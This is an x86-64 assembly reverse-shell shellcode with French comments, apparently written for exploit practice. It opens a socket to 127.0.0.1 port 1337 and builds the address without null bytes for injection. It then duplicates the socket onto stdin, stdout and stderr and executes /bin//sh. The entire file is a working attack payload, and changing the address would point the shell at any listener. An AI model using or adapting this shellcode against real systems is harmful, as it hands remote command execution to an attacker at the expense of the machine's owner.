BITS 64
SECTION .text
global _start
_start:
    xor rax, rax
    xor rbx, rbx    
    xor rcx, rcx
    xor rdx, rdx
    xor r14, r14

    mov al, 41    ;sys_socket
    mov dil, 2
    mov sil, 1
    mov rdx, rbx
    syscall
    mov r13 , rax    ;récupération de la sortie de sys_socket

    mov al, 42    ;sys_connect
    mov rdi, r13    ; sortie de sys_socket
    push rcx
    mov r14, 0x02ffff80 ;On calcule 127.0.0.1 pour éviter les nullbytes
    sub r14, 0x01ffff01
    push r14
    push word 0x3905    ; port = 1337
    push word 0x2    ; domain/family = 2
    mov rsi, rsp    
    mov dl,0x11    ;len(addr)
    syscall    
    
    mov al, 33    ;dup2
    mov rdi, r13    ;on remplace stdin, stdout et stderr par le socket
    xor rsi, rsi    
    syscall

    mov al,33    ;dup2
    mov rdi, r13    
    mov sil, 0x1
    syscall

    mov al,33    ;dup2
    mov rdi, r13
    mov sil,0x2
    syscall

    xor rbx, rbx    ;On nullifie rbx pour réinitialiser rdx
    mov al, 59    ;execve
    mov rdi, 0x68732f6e69622f2f    ;hs/nib//
    push rbx    
    push rdi
    mov rdi, rsp
    push rbx
    push rdi
    mov rsi, rsp
    mov rdx, rbx
    syscall

    mov al, 60    ;fermeture propre du programme
    mov rdi, rbx
    syscall